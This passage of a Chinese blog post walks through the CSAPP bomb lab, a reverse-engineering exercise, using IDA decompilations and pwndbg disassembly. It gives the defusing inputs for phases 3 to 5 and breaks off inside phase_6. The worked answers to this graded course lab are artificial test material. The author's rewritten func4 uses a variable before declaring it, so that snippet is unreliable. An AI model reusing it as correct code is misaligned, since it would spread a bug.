<span class="keyword">if</span> ( *(_DWORD *)v2 != (_DWORD)result )</span><br><span class="line">      <span class="built_in">explode_bomb</span>(a1, &amp;v3);</span><br><span class="line">    v2 += <span class="number">4</span>;  <span class="comment">// 转成_DWORD*加1, 或char*加4</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 != &amp;v5 );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">read_six_numbers</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = __isoc99_sscanf(a1, <span class="string">&quot;%d %d %d %d %d %d&quot;</span>, a2, a2 + <span class="number">4</span>, a2 + <span class="number">8</span>, a2 + <span class="number">12</span>, a2 + <span class="number">16</span>, a2 + <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)result &lt;= <span class="number">5</span> )</span><br><span class="line">    <span class="built_in">explode_bomb</span>(a1, <span class="string">&quot;%d %d %d %d %d %d&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序会使用sscanf() 从rax地址的字符串中读取6个整数到rsp往后的24=18h个字节处，读入第一个数字需要为1，后面每个数字需要是前一个数字的2倍。</p><aside>💡 笔记：sscanf()和scanf()都是读取到局部缓冲区的，这样大块的局部内存是在栈上，是从低位往高位放的（与栈增长的方向相反）。</aside><h1 id="phase-3">phase_3</h1><p>反编译 <code>phase_3()</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_3</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_sscanf(a1, <span class="string">&quot;%d %d&quot;</span>, &amp;v4, &amp;v5) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">explode_bomb</span>(a1, <span class="string">&quot;%d %d&quot;</span>, v1, v2);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      result = <span class="number">207LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      result = <span class="number">311LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      result = <span class="number">707LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      result = <span class="number">256LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      result = <span class="number">389LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      result = <span class="number">206LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      result = <span class="number">682LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      result = <span class="number">327LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">explode_bomb</span>(a1, <span class="string">&quot;%d %d&quot;</span>, v1, v2);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != v5 )</span><br><span class="line">    <span class="built_in">explode_bomb</span>(a1, <span class="string">&quot;%d %d&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><aside>💡 笔记：JA (above) 和 JB (below) 针对无符号数，JG (greater) 和 JL (lower) 针对有符号数，cmp 是-=，test是&，switch语句是通过跳转表结果实现的，效率高</aside><h1 id="phase-4">phase_4</h1><p><code>phase_4()</code> 和 <code>func4()</code> 的反编译结果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_4</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-10h] BYREF  // IDA是根据jbe判断为无符号数的</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(a1, <span class="string">&quot;%d %d&quot;</span>, &amp;v2, &amp;v3) != <span class="number">2</span> || v2 &gt; <span class="number">0xE</span> )</span><br><span class="line">    <span class="built_in">explode_bomb</span>();</span><br><span class="line">  result = <span class="built_in">func4</span>(v2, <span class="number">0LL</span>, <span class="number">14LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result || v3 )</span><br><span class="line">    <span class="built_in">explode_bomb</span>();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">func4</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = ((<span class="type">int</span>)a3 - (<span class="type">int</span>)a2) / <span class="number">2</span> + a2;  <span class="comment">// v3 = (a2+a3)/2 = 7L</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; (<span class="type">int</span>)a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">func4</span>(a1, a2, (<span class="type">unsigned</span> <span class="type">int</span>)(v3 - <span class="number">1</span>));</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; (<span class="type">int</span>)a1 )</span><br><span class="line">    result = <span class="number">2</span> * (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">func4</span>(a1, (<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>), a3) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察 <code>phase_4()</code> ，输入的第一个数字v2不能大于14，第二个数字v3必须为0，且<code>func4()</code>必须返回0。</p><p>观察 <code>func4()</code>，其实就可以获得一组解：<code>7 0</code> ，结果进行再整理一下可以看出是个二分算法（但具体是干啥的猜不出，欢迎大神在评论区解答）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">func4</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> i, <span class="type">int</span> j)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (val == n) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> val = (j + i) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val &lt;= n) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * <span class="built_in">func4</span>(n, val+<span class="number">1</span>, j) + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * <span class="built_in">func4</span>(n, i, val<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>phase_4共有4组解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">3</span> <span class="number">0</span></span><br><span class="line"><span class="number">7</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><aside>💡 笔记: shl/shr分别是逻辑左/右移，sal/sar是算术移动</aside><h1 id="phase-5">phase_5</h1><p>反编译代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">phase_5</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">string_length</span>() != <span class="number">6</span> )</span><br><span class="line">    <span class="built_in">explode_bomb</span>(a1, a2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">6</span>; ++i )</span><br><span class="line">    v4[i] = array_3449[*(_BYTE *)(a1 + i) &amp; <span class="number">0xF</span>];</span><br><span class="line">  v4[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strings_not_equal</span>(v4, <span class="string">&quot;flyers&quot;</span>) )</span><br><span class="line">    <span class="built_in">explode_bomb</span>(v4, <span class="string">&quot;flyers&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上还要参考反汇编代码和调试运行时信息才能把这题做好：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble phase_5</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function phase_5:</span><br><span class="line">   <span class="number">0x0000000000401062</span> &lt;+<span class="number">0</span>&gt;:     push   rbx</span><br><span class="line">   <span class="number">0x0000000000401063</span> &lt;+<span class="number">1</span>&gt;:     sub    rsp,<span class="number">0x20</span></span><br><span class="line">   <span class="number">0x0000000000401067</span> &lt;+<span class="number">5</span>&gt;:     mov    rbx,rdi  ; rbx放输入字符串</span><br><span class="line">=&gt; <span class="number">0x000000000040106a</span> &lt;+<span class="number">8</span>&gt;:     mov    rax,QWORD PTR fs:<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x0000000000401073</span> &lt;+<span class="number">17</span>&gt;:    mov    QWORD PTR [rsp+<span class="number">0x18</span>],rax  ; 防护，设置一个canary，可以不管它</span><br><span class="line">   <span class="number">0x0000000000401078</span> &lt;+<span class="number">22</span>&gt;:    <span class="keyword">xor</span>    eax,eax</span><br><span class="line">   <span class="number">0x000000000040107a</span> &lt;+<span class="number">24</span>&gt;:    call   <span class="number">0x40131b</span> &lt;string_length&gt;</span><br><span class="line">   <span class="number">0x000000000040107f</span> &lt;+<span class="number">29</span>&gt;:    cmp    eax,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x0000000000401082</span> &lt;+<span class="number">32</span>&gt;:    je     <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401084</span> &lt;+<span class="number">34</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x0000000000401089</span> &lt;+<span class="number">39</span>&gt;:    jmp    <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line">---------------------------- <span class="keyword">for</span> （参考IDA反编译代码）</span><br><span class="line">   <span class="number">0x000000000040108b</span> &lt;+<span class="number">41</span>&gt;:    movzx  ecx,BYTE PTR [rbx+rax*<span class="number">1</span>]  ; 逐字符访问输入</span><br><span class="line">   <span class="number">0x000000000040108f</span> &lt;+<span class="number">45</span>&gt;:    mov    BYTE PTR [rsp],cl</span><br><span class="line">   <span class="number">0x0000000000401092</span> &lt;+<span class="number">48</span>&gt;:    mov    rdx,QWORD PTR [rsp]</span><br><span class="line">   <span class="number">0x0000000000401096</span> &lt;+<span class="number">52</span>&gt;:    <span class="keyword">and</span>    edx,<span class="number">0xf</span>  ; 取字符低<span class="number">4</span>位</span><br><span class="line">   <span class="number">0x0000000000401099</span> &lt;+<span class="number">55</span>&gt;:    movzx  edx,BYTE PTR [rdx+<span class="number">0x4024b0</span>]  </span><br><span class="line">   <span class="number">0x00000000004010a0</span> &lt;+<span class="number">62</span>&gt;:    mov    BYTE PTR [rsp+rax*<span class="number">1</span>+<span class="number">0x10</span>],dl</span><br><span class="line">   <span class="number">0x00000000004010a4</span> &lt;+<span class="number">66</span>&gt;:    add    rax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004010a8</span> &lt;+<span class="number">70</span>&gt;:    cmp    rax,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x00000000004010ac</span> &lt;+<span class="number">74</span>&gt;:    jne    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x00000000004010ae</span> &lt;+<span class="number">76</span>&gt;:    mov    BYTE PTR [rsp+<span class="number">0x16</span>],<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x00000000004010b3</span> &lt;+<span class="number">81</span>&gt;:    mov    esi,<span class="number">0x40245e</span>  ; <span class="string">&quot;flyers&quot;</span></span><br><span class="line">   <span class="number">0x00000000004010b8</span> &lt;+<span class="number">86</span>&gt;:    lea    rdi,[rsp+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x00000000004010bd</span> &lt;+<span class="number">91</span>&gt;:    call   <span class="number">0x401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">   <span class="number">0x00000000004010c2</span> &lt;+<span class="number">96</span>&gt;:    test   eax,eax</span><br><span class="line">   <span class="number">0x00000000004010c4</span> &lt;+<span class="number">98</span>&gt;:    je     <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004010c6</span> &lt;+<span class="number">100</span>&gt;:   call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x00000000004010cb</span> &lt;+<span class="number">105</span>&gt;:   nop    DWORD PTR [rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x00000000004010d0</span> &lt;+<span class="number">110</span>&gt;:   jmp    <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x00000000004010d2</span> &lt;+<span class="number">112</span>&gt;:   mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x00000000004010d7</span> &lt;+<span class="number">117</span>&gt;:   jmp    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x00000000004010d9</span> &lt;+<span class="number">119</span>&gt;:   mov    rax,QWORD PTR [rsp+<span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x00000000004010de</span> &lt;+<span class="number">124</span>&gt;:   <span class="keyword">xor</span>    rax,QWORD PTR fs:<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x00000000004010e7</span> &lt;+<span class="number">133</span>&gt;:   je     <span class="number">0x4010ee</span> &lt;phase_5+<span class="number">140</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004010e9</span> &lt;+<span class="number">135</span>&gt;:   call   <span class="number">0x400b30</span> &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   <span class="number">0x00000000004010ee</span> &lt;+<span class="number">140</span>&gt;:   add    rsp,<span class="number">0x20</span></span><br><span class="line">   <span class="number">0x00000000004010f2</span> &lt;+<span class="number">144</span>&gt;:   pop    rbx</span><br><span class="line">   <span class="number">0x00000000004010f3</span> &lt;+<span class="number">145</span>&gt;:   ret</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/s <span class="number">0x4024b0</span></span><br><span class="line"><span class="number">0x4024b0</span> &lt;array<span class="number">.3449</span>&gt;:  <span class="string">&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span></span><br><span class="line"></span><br><span class="line">或在IDA中去看这段数据：</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>0 array_3449      db <span class="number">6</span>Dh                  ; DATA XREF: phase_5+<span class="number">37</span>↑r</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>1                 db  <span class="number">61</span>h ; a</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>2                 db  <span class="number">64</span>h ; d</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>3                 db  <span class="number">75</span>h ; u</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>4                 db  <span class="number">69</span>h ; i</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>5                 db  <span class="number">65</span>h ; e</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>6                 db  <span class="number">72</span>h ; r</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>7                 db  <span class="number">73</span>h ; s</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>8                 db  <span class="number">6</span>Eh ; n</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>9                 db  <span class="number">66</span>h ; f</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>A                 db  <span class="number">6F</span>h ; o</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>B                 db  <span class="number">74</span>h ; t</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>C                 db  <span class="number">76</span>h ; v</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>D                 db  <span class="number">62</span>h ; b</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>E                 db  <span class="number">79</span>h ; y</span><br><span class="line">.rodata:<span class="number">00000000004024B</span>F                 db  <span class="number">6</span>Ch ; l</span><br><span class="line">.rodata:<span class="number">00000000004024</span>C0 ; <span class="type">const</span> <span class="type">char</span> aSoYouThinkYouC[]</span><br><span class="line">.rodata:<span class="number">00000000004024</span>C0 aSoYouThinkYouC db <span class="string">&#x27;So you think you can stop the bomb with ctrl-c, do you?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004024</span>C0                                         ; DATA XREF: sig_handler+<span class="number">4</span>↑o</span><br><span class="line">.rodata:<span class="number">00000000004024F</span>8 ; <span class="type">const</span> <span class="type">char</span> aCursesYouVeFou[]</span><br><span class="line">.rodata:<span class="number">00000000004024F</span>8 aCursesYouVeFou db <span class="string">&#x27;Curses, you&#x27;</span>,<span class="number">27</span>h,<span class="string">&#x27;ve found the secret phase!&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004024F</span>8                                         ; DATA XREF: phase_defused+<span class="number">53</span>↑o</span><br></pre></td></tr></table></figure><p>看反汇编代码时可参考IDA生成的指令流图：</p><p><img src="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/Untitled.png" alt="Untitled"></p><p>程序意图为：读取一个长度为6的字符串，对于每个字符截取后四位数字，用来作为index获取另一个字符串里对应的字符，并保存起来，产生一个新的长度为6的字符串，要求等于另一个字符串。</p><p>根据IDA中.rodata中0x4024b0处数据可以直观看到：”flyers”各字符在0x4024b0字符串中分别由索引<code>9FE567</code> 获得，输入的字符串后4位需分别为这些数。参考ASCII表：</p><p><img src="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/Untitled%201.png" alt="Untitled"></p><p>可构造出输入：<code>9?&gt;567</code></p><hr><p>前排提示：phase_6 和 secret_phase 难度稍大，想速通的玩家可以先跳过。</p><h1 id="phase-6">phase_6</h1><p>对于涉及复杂数据结构的程序，IDA的反编译结果可读性不佳（反编译代码甚至比反汇编还长），这里不妨先看看反汇编的结果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble phase_6</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function phase_6:</span><br><span class="line">   <span class="number">0x00000000004010f4</span> &lt;+<span class="number">0</span>&gt;:     push   r14</span><br><span class="line">   <span class="number">0x00000000004010f6</span> &lt;+<span class="number">2</span>&gt;:     push   r13</span><br><span class="line">   <span class="number">0x00000000004010f8</span> &lt;+<span class="number">4</span>&gt;:     push   r12</span><br><span class="line">   <span class="number">0x00000000004010fa</span> &lt;+<span class="number">6</span>&gt;:     push   rbp</span><br><span class="line">   <span class="number">0x00000000004010fb</span> &lt;+<span class="number">7</span>&gt;:     push   rbx</span><br><span class="line">   <span class="number">0x00000000004010fc</span> &lt;+<span class="number">8</span>&gt;:     sub    rsp,<span class="number">0x50</span></span><br><span class="line">   <span class="number">0x0000000000401100</span> &lt;+<span class="number">12</span>&gt;:    mov    r13,rsp</span><br><span class="line">   <span class="number">0x0000000000401103</span> &lt;+<span class="number">15</span>&gt;:    mov    rsi,rsp</span><br><span class="line">   <span class="number">0x0000000000401106</span> &lt;+<span class="number">18</span>&gt;:    call   <span class="number">0x40145c</span> &lt;read_six_numbers&gt;  <span class="comment">// 6个输入数字读在rsp位置</span></span><br><span class="line">---------------------------- 外层 <span class="keyword">for</span></span><br><span class="line">   <span class="number">0x000000000040110b</span> &lt;+<span class="number">23</span>&gt;:    mov    r14,rsp</span><br><span class="line">   <span class="number">0x000000000040110e</span> &lt;+<span class="number">26</span>&gt;:    mov    r12d,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401114</span> &lt;+<span class="number">32</span>&gt;:    mov    rbp,r13</span><br><span class="line">   <span class="number">0x0000000000401117</span> &lt;+<span class="number">35</span>&gt;:    mov    eax,DWORD PTR [r13+<span class="number">0x0</span>] ; rbp,r14,r13都等于rsp, rsi在进入read函数后被改</span><br><span class="line">   <span class="number">0x000000000040111b</span> &lt;+<span class="number">39</span>&gt;:    sub    eax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040111e</span> &lt;+<span class="number">42</span>&gt;:    cmp    eax,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x0000000000401121</span> &lt;+<span class="number">45</span>&gt;:    jbe    <span class="number">0x401128</span> &lt;phase_6+<span class="number">52</span>&gt; ; <span class="number">6</span>个元素都: 减<span class="number">1</span>后小于等于<span class="number">5</span></span><br><span class="line">   